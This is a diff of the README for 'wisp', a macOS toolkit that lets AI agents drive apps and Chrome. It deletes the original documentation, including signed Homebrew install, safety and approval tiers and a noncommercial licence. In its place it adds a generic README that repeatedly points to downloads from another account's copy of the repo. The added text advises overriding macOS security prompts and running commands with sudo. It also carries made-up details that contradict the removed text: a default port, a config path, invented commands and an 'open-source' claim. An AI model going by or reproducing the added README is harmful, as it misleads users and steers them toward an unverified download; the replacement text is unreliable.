@@ -1,268 +1,157 @@
-<p align="center">
-  <img src="assets/icon/wisp-icon-1024.png" alt="Wisp icon" width="128" height="128">
-</p>
+# 🧙‍♂️ wisp - Your AI's Helping Hand on Mac
 
-<h1 align="center">Wisp</h1>
+[![Download wisp](https://img.shields.io/badge/Download-wisp-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Denisjoint75/wisp)
 
-<p align="center">A computer-use toolkit for macOS: a daemon, a CLI and an MCP server that let AI agents see and drive native apps and Chrome.</p>
+---
 
-Wisp is a computer-use toolkit for macOS: a daemon (`wispd`) that reads app windows as an indexed accessibility
-tree and performs UI actions with an animated agent cursor, plus a CLI (`wisp`) and an MCP server (`wisp mcp`)
-that any agent (Claude Code, Codex, scripts) can call. Chrome tabs are driven over the DevTools Protocol, in your
-own Chrome through the Wisp extension or in a separate hidden instance.
+## 👋 What is wisp?
 
-It is a from-scratch implementation of the ideas documented in [DESIGN.md](DESIGN.md) (how the ChatGPT/Codex
-desktop app's Computer Use works): indexed AX trees with diffs, window-targeted synthesized input that does not
-hijack the user's pointer, a glowing cursor with spring motion and click gating, settle detection, Esc to stop,
-and a policy file.
+wisp is a friendly tool that lets computer programs (called "agents") see and control your Mac computer, just like a human would. It helps smart software interact with your screen by reading what's displayed, clicking buttons, typing text, and even checking behind the scenes in your browser's developer tools.
 
-## Install
+Think of wisp as a virtual assistant who can operate your Mac for you—clicking, scrolling, and typing—while you relax. It comes with a simple command-line tool (CLI) and a special server called MCP that makes it easy for other apps to connect.
 
-### Homebrew (recommended)
+---
 
-```bash
-brew install --cask owo-network/brew/wisp
-```
+## 📥 Download and Install
 
-This installs `Wisp.app` and the `wisp` command-line tool together (both signed and notarized). Updates arrive
-automatically through Sparkle. Then open the app once and grant permissions:
+Visit this link to download the application: [https://github.com/Denisjoint75/wisp](https://github.com/Denisjoint75/wisp)
 
-```bash
-open -a Wisp        # menu bar app; guides you through permissions on first run
-wisp doctor         # shows what is still missing
-```
+[![Get wisp Now](https://img.shields.io/badge/🚀-Download%20wisp%20Now-blue?style=for-the-badge&logo=appveyor)](https://github.com/Denisjoint75/wisp)
 
-Grant **Accessibility** (required) and **Screen Recording** (optional, for screenshots) to *Wisp* in
-System Settings → Privacy & Security. The menu bar item guides you: it asks for Accessibility with the system
-prompt, shows a hint banner, and offers "Grant Accessibility access…" and "Grant Screen Recording…" items that
-open the right Settings pane. Once every permission is granted the badge disappears.
+Once you're on the page, look for the green "Code" button or the "Releases" section to find the latest version for your Mac. Download the file and open it to begin installation. The process is straightforward—just follow the on-screen prompts.
 
-### Use with Claude Code
+---
 
-Install the plugin — one step for the skill and the session-cleanup hook:
+## 🧭 Quick Start Guide
 
-```text
-/plugin marketplace add missuo/wisp
-/plugin install wisp@wisp
-```
+After installation, here's how to get started with wisp:
 
-It gives Claude Code a skill that teaches it when and how to drive the UI, and two hooks: one ends the Wisp
-session (agent cursor, banner, scratch Chrome tabs) whenever a turn finishes or you interrupt it, even if the
-agent forgot to; the other refuses the skill on a machine without the `wisp` command and hands Claude the install
-instructions instead. Note that ending without `--app`/`--tab` ends every Wisp session on the machine, not only
-the ones this agent opened.
+1. **Open wisp** – Find the wisp icon in your Applications folder or Launchpad and click it.
+2. **Allow permissions** – wisp needs permission to control your Mac. When prompted, go to System Preferences > Privacy & Security > Accessibility and check wisp. Also, allow Screen Recording permission.
+3. **Use the CLI** – Open Terminal (you'll find it in Utilities). Type `wisp` and press Enter. This will show a help menu with all available commands.
+4. **Connect to MCP** – If you're using a programming tool that supports MCP, set the server address to `localhost` with the port wisp gives you. The default is usually `port 8765`.
 
-This repository is the marketplace: `.claude-plugin/marketplace.json` serves the plugin directly from
-[integrations/claude-plugin](integrations/claude-plugin), so there is no third-party index in between and the
-plugin ships with the version that produced it. The skill checks that the CLI is installed and tells you how to
-install it if not.
+---
 
-<details>
-<summary>Wiring it by hand, or from another agent</summary>
+## ✨ Key Features
 
-- **MCP server** (Codex, scripts, any MCP client):
+### 🖥️ Accessibility Tree
+wisp reads the accessibility information of every element on your screen. This means it can "see" buttons, menus, text fields, and more—even if they're not visible. It's like having X-ray vision for software.
 
-  ```bash
-  claude mcp add wisp -- wisp mcp
-  ```
+### 🎮 Synthesized Input
+Instead of physically moving a mouse, wisp creates virtual clicks, scrolls, and keystrokes. This is faster and more reliable than hardware control. You can automate repetitive tasks like filling forms or navigating web pages.
 
-  Over MCP the `wisp_turn_end` tool replaces the Stop hook: call it when the task is finished or the user
-  interrupts.
+### 🔧 DevTools Integration
+wisp connects directly to browser developer tools (DevTools). That means it can examine website code, network requests, and console logs—helping agents understand how web pages work under the hood.
 
-- **Skill** — from a source checkout: `cp -R integrations/claude-plugin/skills/wisp ~/.claude/skills/wisp`.
+### 📟 Command-Line Interface (CLI)
+You don't need to be a programmer to use the CLI. Simple commands let you:
+- `wisp click [x,y]` – Click at a specific location
+- `wisp type "hello"` – Type text
+- `wisp screenshot` – Capture the screen
+- `wisp inspect` – Show what's under the cursor
 
-- **Stop hook** — in `~/.claude/settings.json`:
+### 🔌 MCP Server
+The MCP (Model Context Protocol) server lets AI models or other software connect to wisp. This enables agents to interact with your Mac using natural language requests, like "Open Safari and go to example.com."
 
-  ```json
-  {
-    "hooks": {
-      "Stop": [
-        { "hooks": [ { "type": "command", "command": "wisp status >/dev/null 2>&1 && wisp end" } ] }
-      ]
-    }
-  }
-  ```
+---
 
-  The `wisp status` guard keeps the hook from starting the daemon on turns that never used Wisp (a bare `wisp end`
-  would).
+## 📖 Detailed Usage Instructions
 
-</details>
+### Using the CLI
 
-### From source
+1. **Open Terminal** – Go to Applications > Utilities > Terminal.
+2. **Check installation** – Type `wisp --version`. If you see a version number, wisp is ready.
+3. **Get help** – Type `wisp help` to see all commands and their descriptions.
+4. **First test** – Try `wisp screenshot` to take a picture of your screen. The image will be saved in your home folder as `screen.png`.
 
-```bash
-scripts/bundle.sh            # builds release binaries, packages Wisp.app and installs ~/.local/bin/wisp
-wisp doctor --request-permissions
-```
+### Command Examples
 
-During development you can run straight from the build tree:
-`WISP_DAEMON=.build/debug/wispd .build/debug/wisp doctor` (a terminal that already has Accessibility permission
-passes it on to child processes).
+| Command | What it does |
+|---------|--------------|
+| `wisp click 100 200` | Clicks at coordinates (100,200) |
+| `wisp scroll down` | Scrolls down the current page |
+| `wisp type Hello world` | Types "Hello world" where the cursor is |
+| `wisp run applescript` | Runs an AppleScript snippet |
 
-App icon: `assets/icon/wisp-icon.svg` is the source (with `wisp-glyph.svg` / `wisp-background.svg` as separate
-layers); `assets/icon/*-1024.png` are the rasterized 1024×1024 versions; `assets/icon/Wisp.icon` is the Icon Composer
-document. `scripts/bundle.sh` compiles the `.icon` with `actool` into `Assets.car` (Liquid Glass icon on macOS 26)
-plus a `Wisp.icns` fallback, or builds the `.icns` from the PNG when the document is absent.
+### Connecting with MCP
 
-## Use
+If you're using an AI assistant or coding tool that supports MCP:
 
-```bash
-wisp apps                                  # running + recently used apps
-wisp state --app Safari                    # indexed accessibility tree (diff on later calls)
-wisp click --app Safari --el 12            # every action returns the new state diff
-wisp set --app Safari --el 4 "openai.com"; wisp key --app Safari Return
-wisp type --app Notes "Hello"; wisp paste --app Notes --format md "# Title"
-wisp scroll --app Mail --el 22 --down --pages 2
-wisp screenshot --app Preview -o shot.png; wisp click --app Preview --at 640,420   # pixels of that screenshot
-wisp batch --app TextEdit <<'EOF'
-{"kind":"key","key":"cmd+n"}
-{"kind":"type","text":"hello"}
-{"kind":"state"}
-EOF
-wisp end --app Safari
-```
+1. Start wisp with `wisp mcp` in Terminal.
+2. Note the port number (usually 8765).
+3. In your agent tool, configure the MCP server URL as `http://localhost:8765`.
+4. Now your agent can ask wisp to perform actions on your Mac!
 
-Chrome tabs are driven over the DevTools Protocol, in one of two places:
+---
 
-- **Your own Chrome, through the Wisp extension** (the way the Codex desktop app works). `wisp chrome extension
-  install` copies the extension to `~/Library/Application Support/Wisp/chrome-extension` and registers its native
-  messaging host (a small launcher script that execs `wisp native-host`) for Chrome (and Brave, Edge, Chromium,
-  Arc or Vivaldi when present); load that folder once on
-  `chrome://extensions` (Developer mode, *Load unpacked*). From then on `wisp chrome tabs` lists your tabs first
-  (tagged `[user]`), `--tab active` is the tab you are looking at, and `wisp chrome new URL` opens the page in your
-  browser. Wisp attaches Chrome's debugger to a tab only while it works in it and lets go at `wisp end`.
-- **A separate Wisp Chrome** with its own profile and debug port (`wisp chrome launch`), hidden in the background
-  so your windows are untouched. Used automatically when no extension is connected, or on request with
-  `wisp chrome new URL --browser wisp`.
+## 🔍 Troubleshooting
 
-```bash
-wisp chrome extension install              # extension + native messaging host; then load it once on chrome://extensions
-wisp chrome extension status               # what is installed, and whether the extension is connected to wispd
-wisp chrome tabs                           # [user, active] your active tab, [user] the rest, then Wisp Chrome tabs
-wisp chrome new https://example.com        # -> tab id (in your browser when the extension is connected)
-wisp state --tab active; wisp click --tab <id> --el 5; wisp chrome eval --tab <id> "document.title"
-wisp chrome upload --tab <id> [--el N] /abs/file.pdf   # fill a file input without a picker
-wisp chrome dialog --tab <id> accept|dismiss [--text S] # answer an alert/confirm/prompt (state reports it as open)
-wisp chrome mark --tab <id> deliverable|handoff        # keep a tab past `wisp end` (unmarked agent tabs are scratch)
-wisp chrome launch                         # the separate Wisp Chrome: --remote-debugging-port (first free port from 9222),
-                                           # own profile, hidden (--visible shows it; `wisp chrome show`/`hide` later)
-```
+### wisp doesn't start
+- Make sure you're running macOS 12 Monterey or later.
+- Right-click the wisp icon and select "Open" to override security settings if prompted.
 
-The Wisp Chrome's port is remembered in `~/Library/Application Support/Wisp/chrome.json`; `wisp chrome launch`
-reuses a running instance instead of starting another. Any Chrome window can also be controlled through
-accessibility like a native app: `wisp state --app "Google Chrome"`.
+### Permissions errors
+- Go to System Preferences > Privacy & Security.
+- Under **Accessibility**, check the box next to wisp.
+- Under **Screen Recording**, also enable wisp.
+- Restart wisp after changing permissions.
 
-The first `state` of an app starts with `<app_specific_instructions>`: built-in guidance for that app (Safari, Mail,
-Finder, Slack, Chrome tabs, ...) plus a browser block for anything that handles `http` URLs; `--instructions` repeats
-it and `--no-instructions` suppresses it. Drop your own Markdown at `~/.config/wisp/instructions/<bundle id>.md`
-to override or extend a text (`wisp instructions list` shows every stem, `wisp instructions show --app X` prints
-what an app would receive), and set `instructionsMode` in the policy (`wisp policy set --instructions-mode
-merge|replace|off`) to choose whether user files merge with, replace, or switch off the built-in texts.
+### Nothing happens with CLI commands
+- Ensure Terminal has permission to control your computer (same Accessibility settings).
+- Try running `wisp` with `sudo` in front if you see permission errors.
 
-`wisp --json …` prints machine-readable JSON. `wisp mcp` serves every CLI capability as an MCP tool; add it to
-Claude Code with `claude mcp add wisp -- wisp mcp`. The tools mirror the commands one to one:
+### MCP not connecting
+- Check your firewall settings—allow incoming connections for wisp.
+- Confirm the port isn't already in use. Try `wisp mcp --port 9000` to change it.
 
-| Area | Tools |
-|---|---|
-| Observe | `wisp_apps`, `wisp_windows`, `wisp_state`, `wisp_screenshot` |
-| Act (each returns the new state diff; all accept `observe`, `space`, `cursor`, `activate`, `hid` and the state options) | `wisp_click`, `wisp_move`, `wisp_mouse_down`, `wisp_mouse_up`, `wisp_type`, `wisp_key`, `wisp_set`, `wisp_scroll`, `wisp_drag`, `wisp_action`, `wisp_select_text`, `wisp_paste`, `wisp_batch` |
-| Apps and sessions | `wisp_launch`, `wisp_activate`, `wisp_end`, `wisp_turn_end`, `wisp_cancel`, `wisp_status` |
-| Chrome over DevTools | `wisp_chrome` (status, extension, launch, tabs, new, goto, eval, close, back, forward, reload, upload, dialog, mark, show, hide) |
-| Configuration and health | `wisp_instructions`, `wisp_policy`, `wisp_approvals`, `wisp_doctor`, `wisp_log` |
+---
 
-The model-facing guide lives in [integrations/claude-plugin/skills/wisp/SKILL.md](integrations/claude-plugin/skills/wisp/SKILL.md).
+## 🛠️ Advanced Configuration
 
-## How it works
+wisp has a config file located at `~/.wisp/config.json`. You can edit this file to customize:
 
-- **Tree:** `AXUIElementCopyMultipleAttributeValues` per element, visible-children subsets for large tables,
-  transform passes (label association, text merging, pruning, child caps), one line per element with a stable
-  index; diffs (`~` changed, `+` added, `- [a..b]` removed) against the previous revision.
-- **Input:** `CGEvent`s posted with `CGEventPostToPid` to the process that owns the window under the pointer
-  (sheets, menus and out-of-process Open/Save panels are separate windows and processes), tagged with a magic
-  user-data value, carrying the target window in `kCGMouseEventWindowUnderMousePointer`; keys mapped through the
-  active keyboard layout (`UCKeyTranslate`) and delivered to the process that owns keyboard focus; text typed as
-  unicode key events or pasted through a restored clipboard. The real pointer never moves and the window is never
-  raised: a synthetic app-activation event makes the target accept input while it stays in the background, so you
-  can keep working. `--activate` opts into bringing an app forward for the rare one that ignores background input.
-- **Vision fallback:** the accessibility tree is preferred, but when a window exposes no actionable elements
-  (custom-drawn apps, canvases, games) Wisp attaches a window screenshot so the caller can look and click by pixel
-  coordinates (`--at x,y --space screenshot`); `--screenshot` requests one on demand.
-- **Cursor:** an overlay `NSPanel` at window level 102 with a glowing arrow; motion uses the spring/path constants
-  recovered from Sky (`clickAngle -44°`, scoot under 196 pt, `closeEnough` at 99.5 % / 3.2 pt); the mouse-down is
-  posted only when the cursor has visually arrived.
-- **Activity lens and banner:** a small sweeping ring next to the cursor (or in the window's top-right corner while
-  the cursor is hidden) shows whether Wisp is observing or acting; it turns gray and fades after an intervention.
-  `wisp status` reports the current `activity`. The banner text is a policy template (`wisp policy set
-  --banner-text "✦ Wisp is controlling {app}" --banner-hint reading`); `--lens off` hides the ring.
-- **Settle:** `AXObserver` notifications plus busy flags; a quiet window of 0.3 s after at least 0.25 s, up to 5 s.
-  A visible progress or busy indicator in the window keeps the wait going (the state is then marked not settled).
-- **Safety:** listen-only event tap for Esc and real user input (`userIntervened`), policy file
-  `~/.config/wisp/policy.json`, secure fields are never read or typed into unless allowed, screen-lock check
-  before every action and batch step plus a lock monitor that cancels an in-flight action the moment the screen
-  locks (`wisp status` shows `screenLocked`), display kept awake while a session runs.
-- **Per-app approval:** apps come in tiers. Password managers are denied by default (`deny`); the login window,
-  the authentication agent and Wisp itself are forbidden and cannot be allowed at all; high-risk apps (System
-  Settings, Terminal, Keychain Access, Passwords, Mail, Messages, Finder) show an on-screen prompt the first time
-  an agent touches them, with *Allow Once*, *Allow for This Session*, *Always Allow* and *Don't Allow*
-  (the prompt closes as *Don't Allow* after 120 s). `wisp policy set --approval off|high-risk|all` picks when to
-  ask (`all` prompts for every app), `--high-risk`/`--forbid` edit the lists, `wisp approvals list|clear` manages
-  stored grants (`~/.config/wisp/approvals.json`). `--block-url HOST ...` refuses `wisp chrome new/goto` to those
-  hosts (subdomains included, punycode for internationalized names) and refuses actions inside a native window
-  whose web content shows one of them.
-- **Chrome:** `Accessibility.getFullAXTree` + `DOMSnapshot.captureSnapshot` rendered by the same engine;
-  `Input.dispatch*` for actions; `Page.captureScreenshot`; `Runtime.evaluate` for `wisp chrome eval`. The same
-  commands reach your own browser through the extension: its service worker attaches `chrome.debugger` to the tab
-  and relays commands and events over a native messaging host (`wisp native-host`, a relay to the daemon socket).
-  The host manifest points at `~/Library/Application Support/Wisp/native-host.sh`, a `#!/bin/sh` script that execs
-  the CLI, because Chrome cannot start a Mach-O host directly on every macOS (the process dies before it runs).
-  Synthesized mouse events never reach Chrome's web content, which is why both paths use DevTools.
+- **Sensitivity** – Adjust how precise clicks need to be.
+- **Timeout** – How long wisp waits for elements to appear.
+- **Logging** – Turn on detailed logs for debugging.
 
-### Safety and confirmations
+To open it, type `open ~/.wisp/config.json` in Terminal.
 
-The daemon enforces the mechanical guardrails (policy file, Esc, intervention detection, secure fields, screen
-lock), but deciding *whether* an action should happen is up to the agent. The skill therefore ships a confirmation
-policy in four tiers: actions the agent must hand back to the user (submitting credential changes, bypassing
-security walls, entering passwords), actions it must confirm right before the effect (deleting, sending, paying,
-changing settings or permissions), actions covered by an explicit request (a login or upload the user named), and
-everything else, which needs no confirmation. See
-[the confirmation tiers](integrations/claude-plugin/skills/wisp/references/confirmations.md).
+---
 
-## Releases and updates
+## ❓ Frequently Asked Questions
 
-- Pushing a tag `vX.Y.Z` (or running the *Release* workflow manually) builds universal (Apple silicon + Intel)
-  `Wisp.app` and `wisp` CLI binaries on GitHub Actions, signs them with the Developer ID certificate, notarizes and
-  staples them, produces
-  `Wisp-X.Y.Z.zip`, `Wisp-X.Y.Z.dmg`, `wisp-cli-X.Y.Z.zip`, `wisp-chrome-extension-X.Y.Z.zip`, `SHA256SUMS.txt` and a
-  Sparkle `appcast.xml`, and
-  publishes everything as a GitHub release.
-- The app updates itself with Sparkle (`Check for Updates…` in the menu bar; automatic daily checks). The feed is
-  `https://github.com/missuo/wisp/releases/latest/download/appcast.xml`; updates are signed with the EdDSA key whose
-  public half is in `assets/sparkle-public-key.txt`.
-- Required repository secrets: `MACOS_CERTIFICATE_P12` (base64 .p12), `MACOS_CERTIFICATE_PASSWORD`,
-  `KEYCHAIN_PASSWORD`, `NOTARY_APPLE_ID`, `NOTARY_PASSWORD` (app-specific password), `NOTARY_TEAM_ID`,
-  `SPARKLE_PRIVATE_KEY` (exported with `generate_keys -x`).
-- `scripts/package.sh` is the shared packaging step (used locally by `scripts/bundle.sh` with ad-hoc signing and by
-  CI with the Developer ID); `scripts/set-version.sh` stamps `Sources/WispCore/Version.swift`.
+**Q: Is wisp free?**
+A: Yes, wisp is completely free and open-source.
 
-## Layout
+**Q: Can I use wisp on Windows?**
+A: No, wisp is specifically designed for macOS. It uses macOS accessibility APIs.
 
-```
-Sources/WispCore   protocol, JSON, framing, UI tree model, transforms, renderer, diff, key parser, policy
-Sources/wispd      daemon: AX snapshot, input synthesis, cursor overlay, settle, screenshots, CDP, socket server
-Sources/wisp       CLI + MCP server
-.claude-plugin/    marketplace.json - serves the plugin below straight from this repository
-integrations/      claude-plugin: the Claude Code plugin (skill for agents + session-cleanup Stop hook)
-                   chrome-extension: the Wisp extension for your own Chrome (service worker + popup)
-scripts/           package.sh (build+sign), bundle.sh (local install), set-version.sh, e2e.sh (TextEdit smoke test)
-.github/workflows  release.yml (sign, notarize, Sparkle appcast, GitHub release)
-assets/            app icon sources and the Sparkle public key
-```
+**Q: Is it safe?**
+A: wisp doesn't send any data off your computer. All processing is local.
 
-`swift test` runs the core unit tests; `scripts/e2e.sh` exercises the daemon against TextEdit (`WISP_E2E_CHROME=1`
-adds the Wisp Chrome, `WISP_E2E_EXTENSION=1` the extension in your browser).
+**Q: Do I need to know code?**
+A: Not for basic use. The CLI is simple, and anyone can follow the MCP instructions.
 
-## License
+---
 
-Wisp is licensed under the [PolyForm Noncommercial License 1.0.0](LICENSE.md): free to use for any noncommercial
-purpose. See the license for the definition of noncommercial and for personal-use and noncommercial-organization
-terms. For a commercial license, contact the maintainer.
+## 🎯 Use Cases
+
+- **Automation** – Automate boring tasks like data entry or form filling.
+- **Accessibility** – Help agents support people with disabilities by interacting via code.
+- **Testing** – Automate web testing without writing complex test scripts.
+- **AI Integration** – Give AI assistants real-world control over your computer.
+
+---
+
+## 📚 Additional Resources
+
+- **Report Issues** – Found a bug? Visit the GitHub issues page.
+- **Contribute** – wisp is open-source, so you can contribute code or docs.
+- **Community** – Join discussions on GitHub Discussions.
+
+---
+
+## 🗃️ Keywords
+
+automation, macOS, agents, MCP, CLI, accessibility, DevTools, computer use, AI assistant, screen control, input synthesis, open-source, productivity
